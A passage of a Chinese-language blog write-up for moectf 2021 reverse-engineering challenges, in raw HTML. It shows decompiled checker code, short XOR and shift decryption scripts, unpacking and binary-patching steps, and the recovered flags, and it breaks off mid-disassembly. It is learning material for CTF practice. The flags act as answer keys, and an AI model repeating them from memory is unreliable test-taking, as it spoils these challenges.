class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong length!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>打开发现事狗屁不通文章生成器</del><br>打开发现是简单的异或加密, 又知道前7个字母是”moectf{“, 然后就可以写脚本啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x28</span>, <span class="number">0x15</span>, <span class="number">0x3A</span>, <span class="number">0x1B</span>, <span class="number">0x44</span>, <span class="number">0x14</span>, <span class="number">0x06</span>]</span><br><span class="line">k = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k[i]) ^ c[i])</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{Ez_x0r}</p></blockquote><h3 id="Realezpy"><a href="#Realezpy" class="headerlink" title="Realezpy"></a>Realezpy</h3><p>是python脚本的字节码, 用uncompyle6反编译一下, 得到下面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: Ezpython.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-07-28 10:01:40</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 931 bytes</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">c = [<span class="number">119</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">74</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">48</span>, <span class="number">120</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">a</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(a[i]) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            result.append((<span class="built_in">ord</span>(a[i]) + <span class="number">114</span> - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= <span class="built_in">ord</span>(a[i]) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">            result.append((<span class="built_in">ord</span>(a[i]) + <span class="number">514</span> - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(<span class="built_in">ord</span>(a[i]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ipt = <span class="built_in">input</span>(<span class="string">&#x27;Plz give me your flag:&#x27;</span>)</span><br><span class="line">out = encrypt(ipt)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ipt) != <span class="built_in">len</span>(c):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong lenth~&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> out[i] != c[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Plz try again?&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Congratulations!!!&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;enjoy the beauty of python ~~~ &#x27;</span>)</span><br><span class="line">            <span class="keyword">import</span> this</span><br></pre></td></tr></table></figure><p>观察一下, 可以写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">119</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">74</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">48</span>, <span class="number">120</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= c[i] &lt;= <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> (c[i] - <span class="number">514</span> - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    <span class="keyword">elif</span> (<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= c[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> (c[i] - <span class="number">114</span> - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> c[i];</span><br><span class="line"></span><br><span class="line">opt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    opt += <span class="built_in">chr</span>(dec(i))</span><br><span class="line"><span class="built_in">print</span>(opt)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>好了, 以上就是小编整理的关于Realezpy的内容了, 看看下面的flag吧.</p><blockquote><p>moectf{Pyth0n_1s_so0o0o0o0_easy}</p></blockquote><h3 id="A-game"><a href="#A-game" class="headerlink" title="A_game"></a>A_game</h3><p>打開康康是什麼遊戲</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">_main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;---  moectf2021  ---&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; [A_game] Welcome to moectf2021.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now input your answer, and if you are right, I will give you flag&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s not enough.&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !box[<span class="number">9</span> * i + j] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v10++;</span><br><span class="line">        box[<span class="number">9</span> * i + j] = Str[v3] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  check1();</span><br><span class="line">  check2();</span><br><span class="line">  check3();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy the beauty of reverse and sudoku!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And here is your flag : moectf&#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(Str); ++k )</span><br><span class="line">    <span class="built_in">putchar</span>(Str[k] ^ magic[k]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给了提示, 是数独. 程序把你填的数放到残缺的数独题中, 如果经过检验通过就可以自动算出flag.</p><p>数独题如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 0 5 0 0 4 3 6 0</span><br><span class="line">0 0 0 0 5 0 0 2 4</span><br><span class="line">0 4 9 6 7 0 0 0 0</span><br><span class="line">1 0 6 0 2 0 0 3 0</span><br><span class="line">9 0 0 7 0 0 1 0 8</span><br><span class="line">0 3 0 0 0 5 0 9 0</span><br><span class="line">2 0 0 5 0 7 0 0 9</span><br><span class="line">7 0 4 0 0 0 8 0 0</span><br><span class="line">0 9 0 0 4 0 0 0 6</span><br></pre></td></tr></table></figure><p>0是要填的, 然后直接去网上找解题器.</p><p><img src="/pictures/moectf_sudoku.png" alt="答案"></p><p>诶真香~~</p><blockquote><p>moectf{S0_As_I_prAy_Un1imited_B1ade_WOrks—-E1m1ya_Shiro}</p></blockquote><h3 id="clothes"><a href="#clothes" class="headerlink" title="clothes"></a>clothes</h3><p>打开发现不对劲, 哦, 原来是加壳了. 查壳发现是aspack. 然后去吾爱上找了个脱壳器, 脱壳后程序无法启动, 不过问题不大, 直接IDA打开即可.</p><p>是异或加密, 直接写解密代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span></span><br><span class="line">a[] = &#123;<span class="number">0x1E</span>, <span class="number">0x2A</span>, <span class="number">0x4E</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0x71</span>, <span class="number">0x3C</span>, <span class="number">0x4F</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x22</span>, <span class="number">0x3E</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x31</span>, <span class="number">0x7D</span>, <span class="number">0x2C</span>, <span class="number">0x36</span>, <span class="number">0x16</span>, <span class="number">0x04</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x53</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x38</span>&#125;,</span><br><span class="line">b[] = &#123;<span class="number">0x73</span>, <span class="number">0x45</span>, <span class="number">0x2B</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x53</span>, <span class="number">0x0D</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x05</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x31</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x58</span>, <span class="number">0x06</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x4C</span>, <span class="number">0x6A</span>, <span class="number">0x32</span>, <span class="number">0x64</span>, <span class="number">0x18</span>, <span class="number">0x45</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i; <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) <span class="built_in">putchar</span>(a[i] ^ b[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>为什么不用python? 问就是当时不会.</del></p><blockquote><p>moectf{45pack_1s_3z_t0_unpack}</p></blockquote><h3 id="大佬请喝coffee"><a href="#大佬请喝coffee" class="headerlink" title="大佬请喝coffee"></a>大佬请喝coffee</h3><p><img src="https://java.com/favicon.ico" alt=""></img></p><p>用jd-gui打开, 发现是矩阵, 脑袋开始痛了.<br>但是, matlab yyds!!!</p><p>问题不大, 把代码整理下, 得到下面的:</p><script type="math/tex; mode=display">\begin{bmatrix}4778 & 3659 & 9011 & 5734 & 4076 & 6812 & 8341 & 6765 & 7435 \\4449 & 5454 & 4459 & 5800 & 6685 & 6120 & 7357 & 3561 & 5199 \\3188 & 6278 & 9411 & 5760 & 9909 & 7618 & 7184 & 4791 & 8686 \\8827 & 7419 & 7033 & 9306 & 7300 & 5774 & 6588 & 5541 & 4628 \\5707 & 5793 & 4589 & 6679 & 3972 & 5876 & 6668 & 5951 & 9569 \\9685 & 7370 & 4648 & 7230 & 9614 & 9979 & 8309 & 9631 & 9272 \\6955 & 8567 & 7949 & 8699 & 3284 & 6647 & 3175 & 8506 & 6552 \\4323 & 4706 & 8081 & 7900 & 4862 & 9544 & 5211 & 7443 & 5676 \\3022 & 8999 & 5058 & 4529 & 3940 & 4279 & 4606 & 3428 & 8889 \\\end{bmatrix} x = \begin{bmatrix}5711942\\4885863\\6387690\\6077067\\5492294\\7562511\\5970432\\5834523\\4681110\\\end{bmatrix}</script><p>《易得》 $ x = \begin{bmatrix}69 &amp; 88 &amp; 99 &amp; 97 &amp; 108 &amp; 105 &amp; 98 &amp; 117 &amp; 114 \end{bmatrix}^\mathrm{T} $</p><p><code>chr()</code>一下, 结果是EXcalibur.</p><blockquote><p>moectf{EXcalibur}</p></blockquote><h3 id="time2go"><a href="#time2go" class="headerlink" title="time2go"></a>time2go</h3><p>打开发现程序很复杂, 后来在知道这是go语言编译后的结果. 真正的程序入口函数是<code>main_main</code>.<br>然后发现程序一直在输出-延迟-输出-延迟. 砸瓦鲁多? 不存在的, 直接把延时函数<code>time_Sleep</code>给屏蔽掉, 方法是打开函数并切到汇编模式,对着函数第一句<code>mov rcx, gs:28h</code>, Edit-&gt;Patch program-&gt;Assemble, 改成<code>ret</code>, 让它直接返回, 别忘了Edit-&gt;Patch program-&gt;Apply patches. 运行程序, 游戏结束!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">welcome to moectf2021!</span><br><span class="line">↓↓↓↓Here&#x27;s your flag↓↓↓↓</span><br><span class="line">moectf&#123;G0_1an8uag3_1</span><br><span class="line">++++++++++++++++++++++++++++++++++</span><br><span class="line">Congratulations!!!!</span><br><span class="line">You are very close to success!!</span><br><span class="line">Try to find the remaining flag!!</span><br><span class="line">++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure><p>然而发现flag只有一半. 无奈地再次分析, 最后花了七八分钟在<code>main_fun2</code>函数的<code>main_CanuFindme</code>变量里找到了后面一半:5_amaz1ng}.</p><blockquote><p>moectf{G0_1an8uag3_15_amaz1ng}</p></blockquote><h3 id="midpython"><a href="#midpython" class="headerlink" title="midpython"></a>midpython</h3><p>又是一个python程序, 不同的是这个被编译成了exe.<br>在网上找了<a href="https://blog.csdn.net/weixin_44362969/article/details/105616531">这篇文章</a>, 按照他的方法, 我得到了MidPython文件, 补上文件的前十六个字节, 修改后缀为pyc, 它终于可以运行了!!!<br>可能是我的打开方式有问题, uncompyle6不能反编译它, 于是我从网上下载了pycdas程序, 得到下面的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">[Code]</span><br><span class="line">    File Name: Midpython.py</span><br><span class="line">    Object Name: &lt;module&gt;</span><br><span class="line">    Arg Count: 0</span><br><span class="line">    Pos Only Arg Count: 0</span><br><span class="line">    KW Only Arg Count: 0</span><br><span class="line">    Locals: 0</span><br><span class="line">    Stack Size: 5</span><br><span class="line">    Flags: 0x00000040 (CO_NOFREE)</span><br><span class="line">    [Names]</span><br><span class="line">        &#x27;key&#x27;</span><br><span class="line">        &#x27;xxor&#x27;</span><br><span class="line">        &#x27;xoor&#x27;</span><br><span class="line">        &#x27;xorr&#x27;</span><br><span class="line">        &#x27;len&#x27;</span><br><span class="line">        &#x27;length&#x27;</span><br><span class="line">        &#x27;input&#x27;</span><br><span class="line">        &#x27;ipt&#x27;</span><br><span class="line">        &#x27;flag&#x27;</span><br><span class="line">        &#x27;range&#x27;</span><br><span class="line">        &#x27;i&#x27;</span><br><span class="line">        &#x27;ord&#x27;</span><br><span class="line">        &#x27;print&#x27;</span><br><span class="line">    [Var Names]</span><br><span class="line">    [Free Vars]</span><br><span class="line">    [Cell Vars]</span><br><span class="line">    [Constants]</span><br><span class="line">        (</span><br><span class="line">            69</span><br><span class="line">            70</span><br><span class="line">            79</span><br><span class="line">            72</span><br><span class="line">            88</span><br><span class="line">            75</span><br><span class="line">            85</span><br><span class="line">            127</span><br><span class="line">            89</span><br><span class="line">            85</span><br><span class="line">            74</span><br><span class="line">            19</span><br><span class="line">            74</span><br><span class="line">            122</span><br><span class="line">            107</span><br><span class="line">            103</span><br><span class="line">            75</span><br><span class="line">            77</span><br><span class="line">            9</span><br><span class="line">            73</span><br><span class="line">            29</span><br><span class="line">            28</span><br><span class="line">            67</span><br><span class="line">        )</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 2</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                None</span><br><span class="line">                11</span><br><span class="line">            [Disassembly]</span><br><span class="line">                0       LOAD_FAST               0: x</span><br><span class="line">                2       LOAD_FAST               1: y</span><br><span class="line">                4       BINARY_XOR</span><br><span class="line">                6       LOAD_CONST              1: 11</span><br><span class="line">                8       BINARY_XOR</span><br><span class="line">                10      RETURN_VALUE</span><br><span class="line">        &#x27;&lt;lambda&gt;&#x27;</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: Midpython.py</span><br><span class="line">            Object Name: &lt;lambda&gt;</span><br><span class="line">            Arg Count: 2</span><br><span class="line">            Pos Only Arg Count: 0</span><br><span class="line">            KW Only Arg Count: 0</span><br><span class="line">            Locals: 2</span><br><span class="line">            Stack Size: 3</span><br><span class="line">            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                &#x27;xxor&#x27;</span><br><span class="line">            [Var Names]</span><br><span class="line">                &#x27;x&#x27;</span><br><span class="line">                &#x27;y&#x27;</span><br><span 